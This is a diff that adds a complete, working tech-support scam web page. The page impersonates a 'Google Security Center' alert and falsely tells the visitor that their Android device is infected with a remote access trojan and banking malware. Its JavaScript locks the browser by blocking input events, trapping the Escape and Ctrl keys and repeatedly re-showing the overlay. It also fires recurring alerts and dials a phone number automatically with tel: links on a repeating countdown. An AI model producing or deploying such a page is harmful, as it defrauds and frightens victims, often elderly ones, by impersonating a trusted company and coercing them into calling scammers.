@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Google Security Center - Critical Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+            color: #202124;
+            overflow: hidden;
+            touch-action: none;
+            -webkit-user-select: none;
+            user-select: none;
+            height: 100vh;
+            width: 100vw;
+        }
+        .freeze-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .google-header {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .google-logo {
+            width: 40px;
+            height: 40px;
+            background: conic-gradient(from -45deg, #ea4335 0deg 90deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc04 270deg 360deg);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .google-text {
+            color: white;
+            font-size: 22px;
+            font-weight: 500;
+        }
+        .security-alert-container {
+            background: white;
+            border-radius: 16px;
+            padding: 40px;
+            width: 95%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+            border: 3px solid #ea4335;
+            animation: alertPulse 2s infinite;
+            position: relative;
+        }
+        @keyframes alertPulse {
+            0% { box-shadow: 0 0 0 rgba(234, 67, 53, 0.4); }
+            50% { box-shadow: 0 0 30px rgba(234, 67, 53, 0.8); }
+            100% { box-shadow: 0 0 0 rgba(234, 67, 53, 0.4); }
+        }
+        .security-badge {
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            background: #ea4335;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: bold;
+            transform: rotate(5deg);
+            box-shadow: 0 4px 15px rgba(234, 67, 53, 0.5);
+        }
+        .alert-icon {
+            width: 80px;
+            height: 80px;
+            background: #ea4335;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+            box-shadow: 0 8px 25px rgba(234, 67, 53, 0.4);
+        }
+        .alert-title {
+            font-size: 28px;
+            color: #ea4335;
+            margin-bottom: 15px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .alert-subtitle {
+            font-size: 18px;
+            color: #4285f4;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+        .alert-message {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            color: #5f6368;
+            text-align: left;
+            padding: 0 10px;
+        }
+        .threat-list {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .threat-item {
+            color: #ea4335;
+            font-weight: 600;
+            margin: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+        .threat-item:before {
+            content: "⚠️";
+            position: absolute;
+            left: 0;
+        }
+        .google-support-number {
+            background: #f1f8fe;
+            border: 2px solid #4285f4;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .support-text {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 10px;
+        }
+        .phone-number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ea4335;
+            letter-spacing: 2px;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        .call-button {
+            background: linear-gradient(135deg, #ea4335 0%, #d32f2f 100%);
+            color: white;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 20px 0;
+            width: 100%;
+            box-shadow: 0 6px 20px rgba(234, 67, 53, 0.4);
+            transition: all 0.3s ease;
+        }
+        .call-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(234, 67, 53, 0.6);
+        }
+        .countdown {
+            font-size: 16px;
+            color: #ea4335;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+        .google-footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            color: rgba(255,255,255,0.7);
+            font-size: 12px;
+        }
+        .emergency-ticker {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #ea4335;
+            color: white;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            animation: tickerScroll 15s linear infinite;
+        }
+        @keyframes tickerScroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+    </style>
+</head>
+<body>
+    <div class="freeze-overlay" id="freezeOverlay">
+        <div class="google-header">
+            <div class="google-logo">G</div>
+            <div class="google-text">Google Security</div>
+        </div>
+        
+        <div class="emergency-ticker">
+            🔴 EMERGENCY: Multiple security threats detected on this device. Immediate action required. Call Google Support immediately. 🔴
+        </div>
+
+        <div class="security-alert-container">
+            <div class="security-badge">HIGH PRIORITY</div>
+            <div class="alert-icon">⚠️</div>
+            <div class="alert-title">CRITICAL SECURITY BREACH</div>
+            <div class="alert-subtitle">Google Security Center Alert #GS-7842</div>
+            
+            <div class="alert-message">
+                Our systems have detected multiple severe security threats on your Android device:
+            </div>
+            
+            <div class="threat-list">
+                <div class="threat-item">Remote Access Trojan (RAT) infection detected</div>
+                <div class="threat-item">Banking malware active - financial data at risk</div>
+                <div class="threat-item">Data exfiltration in progress</div>
+                <div class="threat-item">Device encryption compromised</div>
+            </div>
+
+            <div class="google-support-number">
+                <div class="support-text">Contact Google Security Support immediately:</div>
+                <a href="tel:18888888888" class="phone-number" id="tfn">1-888-888-8888</a>
+                <div class="support-text">24/7 Emergency Support Line</div>
+            </div>
+
+            <button class="call-button" onclick="initiateEmergencyCall()">
+                🚨 CALL EMERGENCY SUPPORT NOW
+            </button>
+            
+            <div class="countdown" id="countdown">Auto-connecting to security specialist in: 15 seconds</div>
+        </div>
+
+        <div class="google-footer">
+            © 2024 Google LLC. Android Security Response Team | Case ID: ASRT-2024-7842
+        </div>
+    </div>
+
+    <script>
+        // Set toll-free number variable
+        const TFN = "18888888888";
+        document.getElementById('tfn').textContent = formatPhoneNumber(TFN);
+
+        // Freeze page completely
+        function freezePage() {
+            document.addEventListener('keydown', blockAllEvents, true);
+            document.addEventListener('mousedown', blockAllEvents, true);
+            document.addEventListener('touchstart', blockAllEvents, true);
+            document.addEventListener('contextmenu', blockAllEvents, true);
+            document.addEventListener('scroll', blockAllEvents, true);
+            
+            document.body.style.overflow = 'hidden';
+            document.documentElement.style.overflow = 'hidden';
+            
+            window.onbeforeunload = function() {
+                return "Google Security Alert: Do not close this window. Your device security is at risk.";
+            };
+            
+            document.oncontextmenu = function() {
+                return false;
+            };
+        }
+
+        function blockAllEvents(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+
+        function formatPhoneNumber(num) {
+            return num.replace(/(\d{1})(\d{3})(\d{3})(\d{4})/, '$1-$2-$3-$4');
+        }
+
+        function initiateEmergencyCall() {
+            window.location.href = 'tel:' + TFN;
+        }
+
+        // Auto-call countdown with urgent messaging
+        let countdown = 15;
+        const countdownElement = document.getElementById('countdown');
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            let urgency = "";
+            if (countdown <= 5) urgency = "URGENT: ";
+            countdownElement.textContent = `${urgency}Auto-connecting to security specialist in: ${countdown} seconds`;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                initiateEmergencyCall();
+                setTimeout(restartCountdown, 3000);
+            }
+        }, 1000);
+
+        function restartCountdown() {
+            countdown = 15;
+            countdownElement.textContent = `Auto-connecting to security specialist in: ${countdown} seconds`;
+            setInterval(() => {
+                countdown--;
+                let urgency = "";
+                if (countdown <= 5) urgency = "URGENT: ";
+                countdownElement.textContent = `${urgency}Auto-connecting to security specialist in: ${countdown} seconds`;
+                if (countdown <= 0) {
+                    initiateEmergencyCall();
+                    countdown = 15;
+                }
+            }, 1000);
+        }
+
+        // Freeze page on load
+        window.onload = function() {
+            freezePage();
+            
+            // Emergency alert every 20 seconds
+            setInterval(() => {            alert("🚨 GOOGLE SECURITY ALERT: Your device remains compromised! Multiple threats active. Call " + formatPhoneNumber(TFN) + " immediately to prevent data loss and financial damage.");
+            }, 20000);
+        };
+
+        // Block escape key and other navigation
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' || e.keyCode === 27 || e.ctrlKey || e.metaKey) {
+                e.preventDefault();
+                alert("⚠️ SECURITY LOCKDOWN: Cannot exit security protocol. Call Google Support to resolve critical threats.");
+            }
+        });
+
+        // Maintain overlay visibility
+        setInterval(() => {
+            document.getElementById('freezeOverlay').style.display = 'flex';
+        }, 100);
+
+        // Simulate security scanning
+        setInterval(() => {
+            document.querySelector('.alert-icon').style.backgroundColor = countdown <= 5 ? '#ff0000' : '#ea4335';
+        }, 500);
+    </script>
+</body>
+</html>
